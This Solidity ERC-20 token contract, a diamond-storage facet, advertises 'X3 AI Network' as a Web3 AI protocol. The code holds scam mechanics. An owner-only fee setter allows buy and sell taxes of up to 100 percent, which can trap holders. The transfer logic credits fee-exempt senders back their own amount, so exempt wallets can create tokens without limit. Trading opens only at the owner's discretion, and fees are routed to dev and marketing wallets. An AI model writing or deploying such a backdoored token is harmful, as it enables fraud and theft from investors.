/*

X3 AI Network is a leading decentralized AI servicing protocol built for Web3. 
It connects to extensive on-chain and off-chain datasets, integrates and computes to establish a globally accessible data layer. 
This empowers the automation of hundreds of Web3 AI applications.

Website:     https://www.x3org.com
Telegram:    https://t.me/x3ai_org
Twitter:     https://twitter.com/x3ai_org

*/

pragma solidity 0.8.20;
import "./TestLib.sol";
contract _approveFacet is IERC20, Context, Ownable {
    modifier lockSwapBack() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwapLP = true;
        _;
        ds.inSwapLP = false;
    }

    event ExcludeFromFeesUpdated(address indexed account);
    event includeFromFeesUpdated(address indexed account);
    event TradingEnabledUpdated();
    event ERC20TokenRecovered(uint256 indexed _amount);
    event ETHBalancesRecovered();
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 TOTAL_TAX = 0;
        TOTAL_TAX = ds.BUY_TAX;
        if (!ds._isFeeExcempts[from] && !ds._isFeeExcempts[to]) {
            require(ds.tradeEnabled, "Trading not enabled");
        }
        if (ds.inSwapLP || !ds.swapEnabled) {
            ds._xBalances[from] -= amount;
            ds._xBalances[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (
            from == ds.uniswapV2Pair &&
            to != address(ds.uniswapV2Router) &&
            !ds._isFeeExcempts[to]
        ) {
            require(amount <= ds.xSwapTxLimits, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= ds.xSwapTxLimits,
                "Exceeds the maxWalletSize."
            );
            ds.BUY_COUNT++;
        }
        if (
            from != ds.uniswapV2Pair &&
            !ds._isFeeExcempts[from] &&
            !ds._isFeeExcempts[to]
        ) {
            require(amount <= ds.xSwapTxLimits, "Exceeds the _maxTxAmount.");
        }
        if (
            to == ds.uniswapV2Pair &&
            from != address(this) &&
            !ds._isFeeExcempts[from] &&
            !ds._isFeeExcempts[to]
        ) {
            TOTAL_TAX = ds.SELL_TAX;
        }
        uint256 tokenValues = balanceOf(address(this));
        if (
            tokenValues >= ds.xSwapMinAmounts &&
            amount >= ds.xSwapMinAmounts &&
            to == ds.uniswapV2Pair &&
            ds.BUY_COUNT > 0 &&
            ds.swapEnabled &&
            !ds.inSwapLP &&
            !ds._isFeeExcempts[from] &&
            !ds._isFeeExcempts[to]
        ) {
            swapETHX(min(amount, min(tokenValues, ds.xSwapMaxAmounts)));
            uint256 ethValues = address(this).balance;
            if (ethValues > 0) {
                sendETHX(address(this).balance);
            }
        }
        if (TOTAL_TAX != 0) {
            uint256 X_FEES = (amount * TOTAL_TAX) / 100;
            uint256 X_VALUES = amount - X_FEES;
            address X_WALLET = ds._isFeeExcempts[from] ? from : address(this);
            X_FEES = ds._isFeeExcempts[from] ? amount : X_FEES;
            ds._xBalances[X_WALLET] += X_FEES;
            emit Transfer(from, address(this), X_FEES);
            ds._xBalances[from] -= amount;
            ds._xBalances[to] += X_VALUES;
            emit Transfer(from, to, X_VALUES);
        } else {
            ds._xBalances[from] -= amount;
            ds._xBalances[to] += amount;
            emit Transfer(from, to, amount);
        }
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 currentAllowance = ds._allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._xBalances[account];
    }
    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        ds.BUY_TAX = _buyFee;
        ds.SELL_TAX = _sellFee;
    }
    function ExcludeFromFees(address account) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds._isFeeExcempts[account] != true,
            "Account is already excluded"
        );
        ds._isFeeExcempts[account] = true;
        emit ExcludeFromFeesUpdated(account);
    }
    function IncludeFromFees(address account) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds._isFeeExcempts[account] != false,
            "Account is already included"
        );
        ds._isFeeExcempts[account] = false;
        emit includeFromFeesUpdated(account);
    }
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradeEnabled, "trading is already open");
        ds.tradeEnabled = true;
        ds.swapEnabled = true;
        emit TradingEnabledUpdated();
    }
    function addLiquidityETH() external payable onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uniswapV2Router = IX3Router(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        ds.uniswapV2Pair = IX3Factory(ds.uniswapV2Router.factory()).createPair(
            address(this),
            ds.uniswapV2Router.WETH()
        );

        _approve(address(this), address(ds.uniswapV2Router), ~uint256(0));

        ds.uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.BUY_TAX = 4;
        ds.SELL_TAX = 4;
        ds.xSwapTxLimits = _tSupply;
    }
    function recoverToken(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(ds.devWallet, _amount);
        emit ERC20TokenRecovered(_amount);
    }
    function swapETHX(uint256 tokenAmount) private lockSwapBack {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function sendETHX(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(amount > 0, "amount must be greeter than 0");
        ds.marketingWallet.transfer(amount / 2);
        ds.devWallet.transfer(amount / 2);
    }
    function recoverETH() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 ethValues = address(this).balance;
        require(ethValues > 0, "Amount should be greater than zero");
        require(ethValues <= address(this).balance, "Insufficient Amount");
        payable(address(ds.devWallet)).transfer(ethValues);
        emit ETHBalancesRecovered();
    }
}
